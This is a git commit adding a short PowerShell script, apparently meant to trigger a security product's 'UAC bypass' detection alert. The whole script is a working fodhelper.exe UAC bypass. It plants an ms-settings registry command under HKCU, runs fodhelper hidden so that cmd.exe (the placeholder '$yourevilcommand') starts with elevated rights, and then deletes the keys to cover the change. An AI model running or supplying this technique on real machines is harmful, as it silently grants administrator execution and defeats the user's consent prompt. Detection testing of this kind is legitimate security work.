73ab123885c498a1e5e819c889b268f2b6d5e1cb
krishanthGit <51735357+krishanthGit@users.noreply.github.com>
2020-11-13 23:13:45 +0530

    Add files via upload

---
+++ UAC-Bypass.ps1
@@ -0,0 +1,12 @@
+#This script helps to generate C1WS "Privilege Escalation Through UAC Bypass" workbench
+
+$yourevilcommand = "C:\Windows\System32\cmd.exe"
+
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $yourevilcommand -Force
+
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+#Cleaning & Removing the entries created.
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
